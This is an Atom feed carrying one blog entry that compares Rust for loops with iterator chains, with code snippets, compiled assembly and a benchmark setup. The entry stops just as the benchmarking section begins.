<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://janstarke.github.io/blog</id>
    <title>Jan Starke Blog</title>
    <updated>2024-06-15T00:00:00.000Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://janstarke.github.io/blog"/>
    <subtitle>Jan Starke Blog</subtitle>
    <icon>https://janstarke.github.io/img/fox/fuchs_blau.ico</icon>
    <entry>
        <title type="html"><![CDATA[Rust: Iterators are not faster, but you should use them]]></title>
        <id>https://janstarke.github.io/blog/2024/06/15/rust-using-iterators</id>
        <link href="https://janstarke.github.io/blog/2024/06/15/rust-using-iterators"/>
        <updated>2024-06-15T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[Since some time, I'm wondering wether using iterators in Rust has some]]></summary>
        <content type="html"><![CDATA[<p>Since some time, I'm wondering wether using iterators in Rust has some
benefits over traditional <code>for</code> loops.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="the-idea">The idea<a class="hash-link" aria-label="Direct link to The idea" title="Direct link to The idea" href="https://janstarke.github.io/blog/2024/06/15/rust-using-iterators#the-idea">​</a></h2>
<p>Consider the following loop:</p>
<div class="language-rust codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-rust codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">let</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">mut</span><span class="token plain"> sum </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> i </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">..=</span><span class="token number" style="color:#36acaa">100</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    sum </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> i</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>which expands during execution to</p>
<div class="language-rust codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-rust codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">let</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">mut</span><span class="token plain"> sum </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sum </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sum </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sum </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">2</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">// ...</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>The way we expressed the sum also defines in which order the summation
has to be done. But, to be honest, we are not interested in the concrete order.
In fact, the single summations could be done on multiple cores simultaneously.</p>
<p>An alternative way of implementing the above algorithm using iterators could be</p>
<div class="language-rust codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-rust codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">let</span><span class="token plain"> sum</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">u32</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">..=</span><span class="token number" style="color:#36acaa">100</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">sum</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>Can this be faster? I don't know. So, let's use a more complicated example and check it out</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="the-test-case">The test case<a class="hash-link" aria-label="Direct link to The test case" title="Direct link to The test case" href="https://janstarke.github.io/blog/2024/06/15/rust-using-iterators#the-test-case">​</a></h2>
<p>To test which approach is faster, we need to prevent the compiler to optimize too simple things. For example, the above code using the <code>for</code> loop compiles to</p>
<div class="language-asm codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-asm codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">    xor     eax, eax</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    mov     ecx, 100</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    xor     edx, edx</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">.LBB45_1:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    mov     esi, edx</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    lea     edx, [rsi, +, 1]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    cmp     esi, 100</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    cmovae  edx, ecx</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    add     eax, esi</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    cmp     esi, 99</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    ja      .LBB45_3</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    cmp     edx, 101</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    jb      .LBB45_1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">.LBB45_3:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    ret</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>while the iterator based approach compiles to</p>
<div class="language-asm codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-asm codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">    mov     eax, 5050</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    ret</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>Of course, this results from the fact that the compiler knows a lot about the code to be optimized. So, again, we need a more complicated code.</p>
<p>We'll do the following:</p>
<ol>
<li>iterate through the first <code>1_000_000</code> integers, stored as <code>String</code></li>
<li>convert the <code>String</code> into <code>u64</code></li>
<li>filter out numbers which are greater or equal to <code>100_000</code></li>
<li>filter out numbers which are no prime numbers</li>
<li>calculate the sum of those numbers</li>
</ol>
<p>We use the following implementations:</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="loop-approach">Loop approach<a class="hash-link" aria-label="Direct link to Loop approach" title="Direct link to Loop approach" href="https://janstarke.github.io/blog/2024/06/15/rust-using-iterators#loop-approach">​</a></h3>
<div class="language-rust codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-rust codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token attribute attr-name" style="color:#00a4db">#[inline(never)]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">fn</span><span class="token plain"> </span><span class="token function-definition function" style="color:#d73a49">sum1</span><span class="token operator" style="color:#393A34">&lt;</span><span class="token lifetime-annotation symbol" style="color:#36acaa">'s</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">data</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">impl</span><span class="token plain"> </span><span class="token class-name">Iterator</span><span class="token operator" style="color:#393A34">&lt;</span><span class="token class-name">Item</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token lifetime-annotation symbol" style="color:#36acaa">'s</span><span class="token plain"> </span><span class="token class-name">String</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">-&gt;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">u64</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">let</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">mut</span><span class="token plain"> s </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> i </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> data </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">let</span><span class="token plain"> </span><span class="token class-name">Ok</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">i</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> i</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">parse</span><span class="token punctuation" style="color:#393A34">::</span><span class="token operator" style="color:#393A34">&lt;</span><span class="token keyword" style="color:#00009f">u64</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> i </span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">100_000</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> i</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">is_prime</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                    s </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> i</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    s</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="iterator-approach">Iterator approach<a class="hash-link" aria-label="Direct link to Iterator approach" title="Direct link to Iterator approach" href="https://janstarke.github.io/blog/2024/06/15/rust-using-iterators#iterator-approach">​</a></h3>
<div class="language-rust codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-rust codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token attribute attr-name" style="color:#00a4db">#[inline(never)]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">fn</span><span class="token plain"> </span><span class="token function-definition function" style="color:#d73a49">sum2</span><span class="token operator" style="color:#393A34">&lt;</span><span class="token lifetime-annotation symbol" style="color:#36acaa">'s</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">data</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">impl</span><span class="token plain"> </span><span class="token class-name">Iterator</span><span class="token operator" style="color:#393A34">&lt;</span><span class="token class-name">Item</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token lifetime-annotation symbol" style="color:#36acaa">'s</span><span class="token plain"> </span><span class="token class-name">String</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">-&gt;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">u64</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    data</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">filter_map</span><span class="token punctuation" style="color:#393A34">(</span><span class="token closure-params closure-punctuation punctuation" style="color:#393A34">|</span><span class="token closure-params">s</span><span class="token closure-params closure-punctuation punctuation" style="color:#393A34">|</span><span class="token plain"> s</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">parse</span><span class="token punctuation" style="color:#393A34">::</span><span class="token operator" style="color:#393A34">&lt;</span><span class="token keyword" style="color:#00009f">u64</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">ok</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">filter</span><span class="token punctuation" style="color:#393A34">(</span><span class="token closure-params closure-punctuation punctuation" style="color:#393A34">|</span><span class="token closure-params">i</span><span class="token closure-params closure-punctuation punctuation" style="color:#393A34">|</span><span class="token plain"> i </span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token number" style="color:#36acaa">100_000</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">filter</span><span class="token punctuation" style="color:#393A34">(</span><span class="token closure-params closure-punctuation punctuation" style="color:#393A34">|</span><span class="token closure-params">i</span><span class="token closure-params closure-punctuation punctuation" style="color:#393A34">|</span><span class="token plain"> i</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">is_prime</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">sum</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="common-code">Common code<a class="hash-link" aria-label="Direct link to Common code" title="Direct link to Common code" href="https://janstarke.github.io/blog/2024/06/15/rust-using-iterators#common-code">​</a></h3>
<p>To implement the <code>is_prime</code> method, I use the following simple code, which is using the <a href="https://crates.io/crates/primes" target="_blank" rel="noopener noreferrer">primes</a> crate:</p>
<div class="language-rust codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-rust codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">trait</span><span class="token plain"> </span><span class="token type-definition class-name">IsPrime</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">fn</span><span class="token plain"> </span><span class="token function-definition function" style="color:#d73a49">is_prime</span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">&amp;</span><span class="token keyword" style="color:#00009f">self</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">-&gt;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">bool</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">impl</span><span class="token plain"> </span><span class="token class-name">IsPrime</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">u64</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">fn</span><span class="token plain"> </span><span class="token function-definition function" style="color:#d73a49">is_prime</span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">&amp;</span><span class="token keyword" style="color:#00009f">self</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">-&gt;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">bool</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token namespace" style="opacity:0.7">primes</span><span class="token namespace punctuation" style="opacity:0.7;color:#393A34">::</span><span class="token function" style="color:#d73a49">is_prime</span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">*</span><span class="token keyword" style="color:#00009f">self</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>In addition, I generate a static data array <code>NUMBERS</code>:</p>
<div class="language-rust codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-rust codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token macro property" style="color:#36acaa">lazy_static!</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">static</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">ref</span><span class="token plain"> </span><span class="token constant" style="color:#36acaa">NUMBERS</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token class-name">Vec</span><span class="token operator" style="color:#393A34">&lt;</span><span class="token class-name">String</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">..</span><span class="token number" style="color:#36acaa">1_000_000</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">map</span><span class="token punctuation" style="color:#393A34">(</span><span class="token closure-params closure-punctuation punctuation" style="color:#393A34">|</span><span class="token closure-params">i</span><span class="token closure-params closure-punctuation punctuation" style="color:#393A34">|</span><span class="token plain"> </span><span class="token macro property" style="color:#36acaa">format!</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">"{i}"</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">collect</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="benchmarking-code">Benchmarking code<a class="hash-link" aria-label="Direct link to Benchmarking code" title="Direct link to Benchmarking code" href="https://janstarke.github.io/blog/2024/06/15/rust-using-iterators#benchmarking-code">​</a></h3>
<p>To test the speed of the above code, I'm using <code>cargo bench</code> with the following test code</p>
